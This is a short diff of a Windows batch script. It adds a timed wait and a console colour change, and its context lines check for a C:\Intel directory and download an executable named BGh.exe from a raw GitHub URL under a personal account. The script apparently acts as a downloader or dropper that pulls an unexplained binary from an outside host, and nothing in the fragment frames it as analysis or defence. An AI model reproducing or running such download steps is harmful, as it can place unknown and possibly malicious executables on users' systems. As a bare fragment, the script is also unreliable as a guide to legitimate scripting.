@@ -1,3 +1,5 @@
+waitfor /t 3 tgzvgtzcut
+color F0
 exit
 if %cd%==C:\Intel goto ok
 dler https://raw.githubusercontent.com/dietrich03muller/test/master/BGh.exe nBGh.exe
